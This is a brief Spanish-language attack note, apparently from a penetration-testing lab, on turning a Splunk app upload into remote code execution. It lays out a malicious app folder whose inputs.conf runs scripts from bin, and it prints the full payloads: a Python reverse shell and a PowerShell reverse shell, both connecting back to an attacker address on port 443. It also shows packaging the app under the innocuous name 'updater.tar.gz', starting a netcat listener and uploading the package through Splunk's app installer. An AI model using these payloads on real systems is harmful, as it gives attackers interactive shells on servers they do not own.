Estructura típica de Splunk_Shell. La idea es empaquetar una app que ejecute scripts desde bin mediante inputs.conf.

Estructura de directorios

splunk_shell/
├── bin
│   ├── rev.py
│   ├── run.ps1
│   └── run.bat
└── default
    └── inputs.conf

rev.py: payload Linux

import sys,socket,os,pty

ip="<kali_ip>"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')

run.ps1: payload Windows

$client = New-Object System.Net.Sockets.TCPClient('<kali_ip>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

Comprimir app

tar -cvzf updater.tar.gz splunk_shell/

Listener

sudo nc -lnvp 443

Después se inicia sesión en Splunk y se usa Install app from file para cargar la aplicación empaquetada.

En Upload app se sube el archivo .tar.gz y se espera la conexión de vuelta.
